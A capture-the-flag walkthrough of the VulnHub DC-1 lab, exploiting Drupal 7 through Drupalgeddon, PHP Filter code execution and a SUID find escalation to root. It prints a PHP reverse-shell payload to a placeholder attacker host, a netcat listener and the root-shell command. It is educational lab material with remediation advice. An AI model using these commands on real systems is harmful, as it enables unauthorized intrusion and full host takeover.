# DC-1 (VulnHub) — Full Walkthrough  
*Including failed attempts and final path to root*

> **Target:** DC-1 (VulnHub)  
> **Platform:** Linux / Drupal 7  
> **Assessment Style:** Black-box / OSCP-style methodology  
> **Author:** nevtech  
> **Disclaimer:** This repository documents a **legal, local CTF** completed in a controlled lab environment.  
> Do **not** use these techniques on systems you do not own or have explicit permission to test.

---

## TL;DR — Attack Chain

1. **Recon:** Nmap → ports **22 / 80 / 111**
2. **Enumeration:** HTTP fingerprinting → **Drupal 7**
3. **Foothold:** **Drupalgeddon (CVE-2014-3704)** → admin user creation
4. **RCE:** PHP Filter module → PHP reverse shell (`www-data`)
5. **Privilege Escalation:** Misconfigured **SUID `/usr/bin/find`**
6. **Result:** Root access + flags captured

---

## Environment

- **Attacker:** Kali Linux  
- **Target IP (final run):** `192.168.56.102`  
- **Attacker IP (listener):** `192.168.56.101`

> Initial enumeration was performed using a NAT-style range (`10.0.2.6`) during setup and testing.  
> Final exploitation and reporting were completed on the `192.168.56.0/24` host-only network.

---

## 1. Reconnaissance

### Host Discovery
```bash
nmap -sn 192.168.56.0/24

---

Port & Service Enumeration
nmap -sS -A -T4 192.168.56.102


Key Findings

Port 80 → Apache 2.2.22 (Debian)

CMS identified as Drupal 7

Additional services:

SSH (22)

RPCBind (111)

2. Enumeration
Web Enumeration

Browsed the application manually

Identified a default Drupal installation

Drupal Endpoint Testing

/?q=user/1 → Access denied (page exists)

/?q=user/2 → Access denied

/?q=user/3 → Page not found

These behaviors aligned with standard Drupal user handling and confirmed CMS fingerprinting.

Exploit Research
searchsploit drupal 7


This revealed multiple attack paths, including CVE-2014-3704 (Drupalgeddon).

3. Failed Attempts (Documented Intentionally)

This section reflects real-world pentesting where tools and assumptions often fail before the target does.

❌ Attempt 1 — /CHANGELOG.txt Disclosure
http://10.0.2.6/CHANGELOG.txt


Result: 404 Not Found
Lesson: Version files are not always exposed. Drupal was still confirmed via headers, page structure, and service fingerprinting.

❌ Attempt 2 — Fragile Drupal PHP Exploits

Tried older Drupal 7 PHP-based PoCs (e.g. 35150.php, 44355.php):

php 35150.php http://10.0.2.6 "id"


Errors encountered

Missing local dependencies (common.inc)

HTTPS / cookie URL assumptions

Why it failed

These exploits relied on environmental assumptions that were not present on the target.

Pivot

Abandoned brittle tooling in favor of a known reliable exploit.

❌ Attempt 3 — Drupalgeddon2 PoC Issues (44448.py)

Two major problems occurred:

1. Python 2 input() evaluation
Entering:

http://10.0.2.6


caused:

SyntaxError: invalid syntax


2. Malformed request construction
The exploit attempted to connect to:

10.0.2.6user


Resulting in:

requests.exceptions.ConnectionError


Pivot

Drupalgeddon2 was unnecessary. DC-1 is reliably exploitable via CVE-2014-3704.

❌ Attempt 4 — Incorrect Script Usage
python2 34992.py -t http://10.0.2.6


Output

Usage: 34992.py -t http[s]://TARGET_URL -u USER -p PASS


Note: Not a real failure — required arguments were missing.

4. Successful Exploitation Path
✅ Step 1 — Drupalgeddon (CVE-2014-3704)

Admin user creation using Metasploit’s public exploit:

python2 34992.py -t http://192.168.56.102 -u oscpadmin -p 'REDACTED'


Result

Administrative Drupal account created

Full access to admin dashboard

✅ Step 2 — RCE via PHP Filter Module

From Drupal admin panel:

Enable PHP Filter

Create a page

Set Text format → PHP code

Insert payload

Listener

nc -lvnp 4444


Payload

<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>


Result

Reverse shell as www-data

✅ Step 3 — Shell Stabilization
python -c 'import pty; pty.spawn("/bin/bash")'

whoami
# www-data

5. Privilege Escalation
SUID Enumeration
find / -perm -4000 2>/dev/null


Finding

/usr/bin/find has SUID bit set

Exploitation
/usr/bin/find . -exec /bin/bash -p \; -quit

whoami
# root

6. Proof of Compromise (Redacted)

/var/www/flag1.txt

settings.php contained database credentials and a flag

/root/thefinalflag.txt

Flags and credentials have been intentionally redacted.

7. Impact

Full web application compromise

Remote code execution

Sensitive configuration disclosure

Privilege escalation to root

Complete host takeover

8. Remediation Recommendations

Upgrade Drupal and remove vulnerable versions

Disable dangerous modules (e.g. PHP Filter)

Remove unnecessary SUID permissions

Restrict access to configuration files

Implement continuous patching and monitoring

Lessons Learned

Not all public exploits are production-ready

Tooling failures require fast pivots

Documenting failed paths improves future efficiency

DC-1 strongly reinforces OSCP-style methodology:
Enumerate → Exploit → Stabilize → Enumerate → PrivEsc


